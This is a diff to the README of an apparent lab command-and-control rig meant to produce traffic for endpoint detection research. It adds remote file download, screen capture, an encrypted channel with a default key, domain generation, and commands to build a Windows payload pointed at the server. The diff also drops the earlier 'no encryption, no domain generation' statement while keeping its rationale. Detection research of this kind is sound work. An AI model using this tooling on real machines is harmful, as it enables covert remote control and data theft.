@@ -60,6 +60,8 @@ No dependencies. `go.mod` declares no requirements, so this builds offline.
 | `--log` | JSONL audit log path |
 | `--no-console` | headless, for scripted runs |
 | `--duration` | stop cleanly after N seconds (0 = run forever) |
+| `--key` | the shared channel key for the encrypted arm (default: the built-in lab key) |
+| `--quarantine` | directory to write received file transfers into |
 
 ### Console commands
 
@@ -67,11 +69,58 @@ No dependencies. `go.mod` declares no requirements, so this builds offline.
   list                 show active sessions
   exec <id|all> <cmd>  run a command in one or all sessions
   ping <id|all>        measure round trip latency
+  cap <id> <tech> [a]  run one technique from the capability library
+  dl <id> <path>       ask a session to transfer a file
+  shot <id>            ask a session to capture the screen
   kill <id|all>        send EXIT (controlled session termination)
   stats                counters and audit log path
   help                 this text
   quit                 stop the server
 ```
+
+### Running it on Linux (the Kali rig)
+
+Nothing about the server is Windows-specific. Two ways:
+
+```bash
+# 1. the Go binary, cross-compiled (one static file, no runtime)
+GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o px_c2 .
+./px_c2 --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
+
+# 2. the Python reference, which needs nothing but a Python 3
+python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
+```
+
+Three things change when the server is on the other machine:
+
+**The payload must be built with the SERVER's address.** The address is
+compiled into the payload, and it is not the same address as the one on
+the Windows box:
+
+```powershell
+# on the build machine
+.\build_variants.ps1 -C2Host 192.168.77.1 -C2Port 9001
+```
+
+**The domain generation arm needs a resolver.** The generated hostname has
+to resolve to the server, and the payload resolves it with the *Windows*
+system resolver. So either the Kali box runs the lab DNS helper on port 53
+and the VM's resolver points at it:
+
+```bash
+python3 dga_dns.py --host 0.0.0.0 --port 53 --c2 192.168.77.1
+```
+
+or the Windows hosts file gets an entry for today's generated name. Every
+other arm connects to the address directly and needs neither.
+
+**The encrypted channel needs both sides to agree on the key.** The
+built-in default is the same on both, so it works with no configuration.
+If the operator sets `--key` on the server, the payload needs the same key
+in `PX_C2_KEY` or compiled in.
+
+The commands still run on the **Windows** machine. Where the server lives
+changes nothing about where the commands land.
 
 ---
 
@@ -79,17 +128,23 @@ No dependencies. `go.mod` declares no requirements, so this builds offline.
 
 ```
 client -> server   HELLO|<arch>|<pid>|<hostname>
+                   CAPS|<mask>
                    PONG
                    RESULT|<cmd_id>|<base64 output>|<exit_code>
+                   CHUNK|<cmd_id>|<seq>|<total>|<base64 bytes>
+                   DONE|<cmd_id>|<total bytes>
 server -> client   PING
                    EXEC|<cmd_id>|<command line>
+                   CAP|<cmd_id>|<technique>|<arguments>
+                   DL|<cmd_id>|<path>
+                   SHOT|<cmd_id>
                    EXIT
 ```
 
-Plain TCP, no encryption, no obfuscation, no domain generation, no traffic
-shaping. The point of this rig is to produce traffic that can be analysed,
-and a payload that can be observed by Defender and Sysmon. A stealthy
-channel would produce nothing worth measuring.
+Plain TCP by default; the encrypted arm wraps each line in a length-
+prefixed frame. The point of this rig is to produce traffic that can be
+analysed, and a payload that can be observed by Defender and Sysmon. A
+stealthy channel would produce nothing worth measuring.
 
 Every session, command, result and disconnect is written to the audit log.
 Nothing is done quietly — including a PONG that arrives with no matching
